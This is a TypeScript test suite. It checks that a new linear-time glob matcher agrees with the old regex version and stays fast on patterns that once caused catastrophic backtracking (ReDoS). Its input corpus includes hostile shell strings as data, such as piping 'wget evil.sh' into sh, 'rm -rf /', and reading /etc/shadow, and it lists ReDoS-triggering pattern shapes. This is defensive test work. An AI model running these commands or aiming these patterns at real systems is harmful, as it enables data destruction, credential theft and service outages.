/**
 * WS-SEC-ReDoS — differential + regression suite for the linear glob matcher.
 *
 * `compileGlob` used to expand `*` → `[^/]*` and `**` → `.*` and hand the
 * concatenation to the backtracking regex engine. Two wildcards separated by a
 * literal already give the engine an exponential number of ways to split a
 * NON-matching subject. Measured before the fix (Node 24, this repo):
 *
 *   256-char subject: `'*a'.repeat(3)`  13 ms
 *                     `'*a'.repeat(4)`  794 ms
 *                     `'*a'.repeat(5)`  56 SECONDS   ← a 10-character pattern
 *    61-char subject: `'**a'.repeat(8)` 24 seconds
 *
 * V8 regexes are uninterruptible, so this wedges the process outright. It is
 * reachable from model-supplied `glob`/`grep`/`replace`/`tree` arguments and
 * from a repo-committed `.gitignore` line.
 *
 * The fix replaces the *matching* with an NFA simulation while keeping the
 * compiled regex `source` byte-identical. This file pins that:
 *
 *  1. DIFFERENTIAL — a verbatim copy of the OLD implementation is the oracle.
 *     Every generated (pattern, input, mode) triple must agree, and the
 *     regex `source` must be identical too.
 *  2. REDOS — the previously catastrophic patterns now finish in milliseconds,
 *     asserted as a real wall-clock bound.
 */

import { describe, expect, it } from 'vitest';
import { compileGlob, compileGlobMatcher } from '../../src/utils/glob-match.js';

// ---------------------------------------------------------------------------
// ORACLE: the pre-fix implementation, copied verbatim. Do not "clean up" —
// its exact quirks (the `[]]` first-member rule, the unclosed-`[` fallback,
// the `**/` slash skip, the escape set) are the specification here.
// ---------------------------------------------------------------------------

function oldEscapeRegex(s: string): string {
  return s.replace(/[.+^${}()|\\]/g, '\\$&');
}

const OLD_COMMAND_WILDCARD_STOP = ';&|\\n\\r`$<>';
const OLD_MAX_GLOB_PATTERN_LEN = 1024;

function oldCompileGlob(pattern: string, commandSubject = false): RegExp {
  if (pattern.length > OLD_MAX_GLOB_PATTERN_LEN) {
    throw new Error(`Glob pattern exceeds ${OLD_MAX_GLOB_PATTERN_LEN} characters`);
  }
  const star = commandSubject ? `[^/${OLD_COMMAND_WILDCARD_STOP}]*` : '[^/]*';
  const question = commandSubject ? `[^/${OLD_COMMAND_WILDCARD_STOP}]` : '[^/]';
  let i = 0;
  let re = '^';
  while (i < pattern.length) {
    const c = pattern[i];
    if (c === '*') {
      if (pattern[i + 1] === '*') {
        re += commandSubject ? `[^${OLD_COMMAND_WILDCARD_STOP}]*` : '.*';
        i += 2;
        if (pattern[i] === '/') i++;
      } else {
        re += star;
        i++;
      }
    } else if (c === '?') {
      re += question;
      i++;
    } else if (c === '[') {
      const closeIndex = pattern.indexOf(']', i + 1);
      if (closeIndex === -1) {
        re += '\\[';
        i++;
        continue;
      }
      let cls = '[';
      i++;
      if (pattern[i] === '!' || pattern[i] === '^') {
        cls += '^';
        i++;
      }
      let firstMember = true;
      while (i < pattern.length && (pattern[i] !== ']' || firstMember)) {
        const ch = pattern[i] ?? '';
        if (ch === '\\') {
          cls += '\\\\';
        } else if (ch === ']' || ch === '^') {
          cls += `\\${ch}`;
        } else {
          cls += ch;
        }
        firstMember = false;
        i++;
      }
      cls += ']';
      re += cls;
      i++;
    } else {
      re += oldEscapeRegex(c ?? '');
      i++;
    }
  }
  re += '$';
  return new RegExp(re);
}

// ---------------------------------------------------------------------------
// Corpus
// ---------------------------------------------------------------------------

const PATTERNS: string[] = [
  // empty / trivial
  '',
  'a',
  'exact.ts',
  '/',
  '//',
  '/leading',
  'trailing/',
  '/both/',
  // single star
  '*',
  '**',
  '***',
  '****',
  '*.ts',
  'a*',
  '*a*',
  '*a*b*',
  'src/*.ts',
  'src/*/*.ts',
  '*/*',
  // globstar and the trailing-slash skip
  '**/*.ts',
  '**/x',
  '**x',
  'src/**',
  'src/**/',
  'src/**/*.ts',
  'src/**/test/**/*.spec.ts',
  '**/**',
  '**/**/a',
  'a/**/b',
  'a**b',
  '**/',
  // question mark
  '?',
  '??',
  'a?c',
  'a?*?b',
  '?/?',
  '*?',
  '?*',
  // character classes
  '[abc]',
  '[abc].txt',
  '[a-z]',
  '[a-z0-9_]*',
  '[!x]',
  '[!abc].txt',
  '[^abc].txt',
  '[]]',
  '[]a]',
  '[!]]',
  '[^]a]',
  '*[]]*',
  'file[0-9].txt',
  '[-a]',
  '[a-]',
  '[.]',
  '[*]',
  '[?]',
  '[/]',
  '[\\]',
  '[[]',
  // unclosed bracket -> literal
  'file[1.txt',
  '[',
  'a[b',
  '[!',
  // literal regex specials that must stay literal
  'a.b',
  'a+b',
  'a$b',
  'a^b',
  'a{2}',
  'a(b)c',
  'a|b',
  'a\\b',
  'a-b',
  '.gitignore',
  'node_modules',
  '*.{ts,js}',
  // shell-ish subjects (relevant in commandSubject mode)
  'git *',
  'git **',
  'npm run *',
  'echo *',
  'cat *',
  '* *',
  // multi-wildcard shapes that used to backtrack
  '*a*a*a',
  '**a**a**a',
  '*/*/*/*',
];

const INPUTS: string[] = [
  '',
  'a',
  'b',
  '/',
  '//',
  'a/',
  '/a',
  'ab',
  'abc',
  'a.txt',
  'd.txt',
  '7.txt',
  ']',
  '[',
  '*',
  '?',
  '-',
  '.',
  '\\',
  'x',
  'foo.ts',
  'foo.js',
  'src/foo.ts',
  'src/a/b/c.ts',
  'src/a/test/b/c.spec.ts',
  'src/test/x.spec.ts',
  'srctestx.spec.ts',
  'a/b',
  'a/b/c',
  'aXb',
  'ab/cd',
  'file1.txt',
  'file[1.txt',
  'filet',
  '.gitignore',
  'node_modules',
  'node_modules/pkg/index.js',
  'a.b',
  'a+b',
  'a$b',
  'a^b',
  'a{2}',
  'a(b)c',
  'a|b',
  'a\\b',
  'a-b',
  'weird;name.ts',
  'a&b',
  'git status',
  'git status; wget evil.sh | sh',
  'git status && rm -rf /',
  'git status | sh',
  'git status\nrm -rf /',
  'echo `id`',
  'echo $(id)',
  'cat x > /etc/passwd',
  'cat < /etc/shadow',
  'npm run a; id',
  'npm run build',
  'aaa',
  'aaaa',
  'aaab',
  'abab',
  'a/a/a/a',
  'x/y/z/w',
  'aaaaaaaaaaX',
  'ünïcödé.ts',
  '😀.ts',
  'tab\there',
  // LineTerminators: `**` compiles to `.*`, which does NOT cross these, and
  // `^…$` is not multiline — so a subject containing one can never match `**`.
  // This corpus entry is what caught the first draft of the linear matcher
  // treating `**` as truly "any character".
  'a\nb',
  'a\rb',
  'a\u2028b',
  'a\u2029b',
  'src/a\nb/c.ts',
];

describe('glob-match differential: new linear matcher vs. old regex implementation', () => {
  it('agrees with the old implementation on every (pattern, input, mode) triple', () => {
    const disagreements: string[] = [];
    let pairs = 0;

    for (const pattern of PATTERNS) {
      for (const commandSubject of [false, true]) {
        // The old implementation is the oracle; if it cannot compile, the new
        // one must refuse identically (see the throw-parity test below).
        let oracle: RegExp;
        try {
          oracle = oldCompileGlob(pattern, commandSubject);
        } catch {
          continue;
        }
        const actual = compileGlob(pattern, commandSubject);
        if (actual.source !== oracle.source) {
          disagreements.push(
            `SOURCE ${JSON.stringify(pattern)} cmd=${commandSubject}: ` +
              `${JSON.stringify(actual.source)} !== ${JSON.stringify(oracle.source)}`,
          );
        }
        const viaMatcher = compileGlobMatcher(pattern, commandSubject);
        for (const input of INPUTS) {
          pairs++;
          const want = oracle.test(input);
          const gotRegex = actual.test(input);
          const gotMatcher = viaMatcher.test(input);
          if (gotRegex !== want || gotMatcher !== want) {
            disagreements.push(
              `${JSON.stringify(pattern)} cmd=${commandSubject} vs ${JSON.stringify(input)}: ` +
                `old=${want} regex=${gotRegex} matcher=${gotMatcher}`,
            );
          }
        }
      }
    }

    expect(pairs).toBeGreaterThan(12000);
    expect(disagreements).toEqual([]);
  });

  it('agrees on randomly generated patterns and inputs', () => {
    // Deterministic PRNG so a failure is reproducible.
    let seed = 0x2f6e2b1;
    const rnd = (n: number): number => {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      return seed % n;
    };
    const PAT_ALPHABET = ['a', 'b', '/', '*', '**', '?', '[ab]', '[a-c]', '[!a]', '.', '-', ';'];
    const IN_ALPHABET = ['a', 'b', 'c', '/', '.', '-', ';', '|', '`', '$', '<', '\n'];

    const disagreements: string[] = [];
    let pairs = 0;
    for (let t = 0; t < 4000; t++) {
      let pattern = '';
      const plen = rnd(7);
      for (let k = 0; k < plen; k++) pattern += PAT_ALPHABET[rnd(PAT_ALPHABET.length)];
      let input = '';
      const ilen = rnd(9);
      for (let k = 0; k < ilen; k++) input += IN_ALPHABET[rnd(IN_ALPHABET.length)];
      const commandSubject = rnd(2) === 1;

      let oracle: RegExp;
      try {
        oracle = oldCompileGlob(pattern, commandSubject);
      } catch {
        continue;
      }
      pairs++;
      const want = oracle.test(input);
      const got = compileGlob(pattern, commandSubject).test(input);
      if (got !== want) {
        disagreements.push(
          `${JSON.stringify(pattern)} cmd=${commandSubject} vs ${JSON.stringify(input)}: old=${want} new=${got}`,
        );
      }
    }
    expect(pairs).toBeGreaterThan(3000);
    expect(disagreements.slice(0, 10)).toEqual([]);
  });

  it('rejects exactly what the old implementation rejected — no new fail-open path', () => {
    // Over-long pattern: both throw. (getCachedGlob still degrades this to
    // NEVER_MATCH for matchGlob; that pre-existing fail-open is unchanged and
    // deliberately not extended.)
    const tooLong = 'a'.repeat(OLD_MAX_GLOB_PATTERN_LEN + 1);
    expect(() => oldCompileGlob(tooLong)).toThrow('exceeds');
    expect(() => compileGlob(tooLong)).toThrow('exceeds');

    // Invalid character class: both throw, from the same cause.
    expect(() => oldCompileGlob('[z-a]')).toThrow();
    expect(() => compileGlob('[z-a]')).toThrow();

    // A pattern at exactly the limit still compiles in both.
    const atLimit = 'a'.repeat(OLD_MAX_GLOB_PATTERN_LEN);
    expect(() => oldCompileGlob(atLimit)).not.toThrow();
    expect(() => compileGlob(atLimit)).not.toThrow();
  });

  it('still returns a real RegExp with the same shape its callers rely on', () => {
    // packages/tools/{glob,grep,replace,tree}.ts call .test() and reset
    // .lastIndex; the gitignore matcher used to read .source.
    const re = compileGlob('src/**/*.ts');
    expect(re).toBeInstanceOf(RegExp);
    // `.source` is RegExp-normalized (`/` → `\/`) exactly as before the fix —
    // the differential loop above asserts source equality with the oracle for
    // the whole corpus, this just pins the concrete shape.
    expect(re.source).toBe('^src\\/.*[^/]*\\.ts$');
    expect(re.flags).toBe('');
    re.lastIndex = 0;
    expect(re.test('src/a/b.ts')).toBe(true);
    re.lastIndex = 0;
    expect(re.test('src/a/b.js')).toBe(false);
    // exec is the single overridden entry point, so String.match works too.
    expect(re.exec('src/a/b.ts')?.[0]).toBe('src/a/b.ts');
    expect(re.exec('src/a/b.js')).toBeNull();
    expect('src/a/b.ts'.match(re)?.[0]).toBe('src/a/b.ts');
  });
});

// ---------------------------------------------------------------------------
// ReDoS regression — real wall-clock bounds.
// ---------------------------------------------------------------------------

function elapsedMs(fn: () => void): number {
  const t0 = performance.now();
  fn();
  return performance.now() - t0;
}

describe('glob-match ReDoS regression (WS-SEC-ReDoS)', () => {
  // Worst case: the subject is all `a`s so every wildcard split looks viable,
  // and the final character makes the whole match FAIL, forcing the old engine
  // to exhaust every split before giving up.
  const subject256 = `${'a'.repeat(255)}X`;
  const subject61 = `${'a'.repeat(60)}X`;

  const CASES: { pattern: string; subject: string; oldMs: string }[] = [
    { pattern: '*a'.repeat(4), subject: subject256, oldMs: '794 ms' },
    { pattern: '*a'.repeat(5), subject: subject256, oldMs: '56 s' },
    { pattern: '**a'.repeat(4), subject: subject256, oldMs: '1.1 s' },
    { pattern: '**a'.repeat(5), subject: subject256, oldMs: '59 s' },
    { pattern: '**a'.repeat(8), subject: subject61, oldMs: '24 s' },
    { pattern: '*a'.repeat(16), subject: subject256, oldMs: 'astronomical' },
    {
      pattern: 'src/**/test/**/*.spec.ts',
      subject: `src/${'a/'.repeat(120)}x.spec.tsX`,
      oldMs: 'slow',
    },
  ];

  for (const { pattern, subject, oldMs } of CASES) {
    it(`${JSON.stringify(pattern)} vs ${subject.length}-char non-matching subject (was ${oldMs})`, () => {
      const re = compileGlob(pattern);
      // Warm the compile out of the measurement.
      re.test('warmup');
      let result = true;
      const ms = elapsedMs(() => {
        result = re.test(subject);
      });
      expect(result).toBe(false);
      expect(ms).toBeLessThan(100);
    });
  }

  it('command-subject mode is bounded too', () => {
    const pattern = `git ${'*a'.repeat(8)}`;
    const subject = `git ${'a'.repeat(250)}X`;
    const re = compileGlob(pattern, true);
    re.test('warmup');
    let result = true;
    const ms = elapsedMs(() => {
      result = re.test(subject);
    });
    expect(result).toBe(false);
    expect(ms).toBeLessThan(100);
  });

  it('a whole batch of hostile patterns stays fast in aggregate', () => {
    // Guards against a fix that is fast per-call only because of the cache.
    const subject = `${'a'.repeat(255)}X`;
    const ms = elapsedMs(() => {
      for (let n = 2; n <= 20; n++) {
        expect(compileGlobMatcher('*a'.repeat(n)).test(subject)).toBe(false);
        expect(compileGlobMatcher('**a'.repeat(n)).test(subject)).toBe(false);
      }
    });
    expect(ms).toBeLessThan(500);
  });
});
